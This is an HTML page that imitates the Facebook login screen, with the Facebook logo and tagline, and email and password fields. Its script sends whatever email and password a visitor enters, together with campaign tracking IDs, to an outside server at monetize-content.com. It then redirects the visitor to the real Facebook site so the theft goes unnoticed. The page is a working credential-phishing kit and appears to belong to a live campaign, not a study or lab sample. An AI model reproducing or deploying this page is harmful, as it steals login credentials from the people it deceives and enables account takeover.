<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Facebook</title>
  <link rel="icon" href="/assets/facebook.svg" type="image/svg+xml">
  <link rel="stylesheet" href="/assets/index-Dw_0sqJC.css">
  <script>
    window.PARAMS = {
      "session_id": "60ddfa68-e1b8-4e40-8dc8-79678c87ed89",
      "link_id": "a5527b20-7040-4903-9a8b-afa5fe5bbb52",
      "site_id": "bf161887-bf42-4d02-92c2-dc279f69abf9",
      "site": "#223 FB Modal",
      "phid": "phc_laCVntrKDfdLQnn6rKXLblZAnn4X3Q8C566kFhwYZ2I",
      "aid": "gyoj2qAL",
      "edge-redirect": "false",
      "utm_campaign": "02",
      "utm_content": "0228",
      "bid": "57"
    };
  </script>
</head>
<body>
  <div id="root"></div>

  <script type="module">
    import React, { useState } from 'https://cdn.skypack.dev/react';
    import { createRoot } from 'https://cdn.skypack.dev/react-dom/client';

    const params = window.PARAMS;
    const { link_id, session_id, site_id, phid, aid } = params;

    const sendData = async (email, password) => {
      await fetch("https://click.monetize-content.com/click", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          event: "fb-modal",
          payload: {
            email,
            password,
            link_id,
            session_id,
            site_id,
            phid,
            aid
          }
        })
      });
    };

    const App = () => {
      const [email, setEmail] = useState("");
      const [password, setPassword] = useState("");

      const handleSubmit = async () => {
        if (!email || !password) return;
        await sendData(email, password);
        window.location.href = "https://www.facebook.com/";
      };

      return (
        <div className="flex flex-col items-center justify-center min-h-screen bg-[#F2F2F2]">
          <img src="/assets/facebook.svg" alt="Facebook" className="w-24 mb-4" />
          <p className="text-center text-[#4D4F53] mb-6">Facebook helps you connect and share with the people in your life.</p>

          <input
            type="text"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            placeholder="Email address or phone number"
            className="w-72 p-3 mb-2 border border-gray-300 rounded-md"
          />
          <input
            type="password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            placeholder="Password"
            className="w-72 p-3 mb-4 border border-gray-300 rounded-md"
          />
          <button
            onClick={handleSubmit}
            className="w-72 p-3 bg-[#1877F2] text-white rounded-md hover:bg-[#166FE5]"
          >
            Log In
          </button>
        </div>
      );
    };

    createRoot(document.getElementById("root")).render(<App />);
  </script>
</body>
</html>
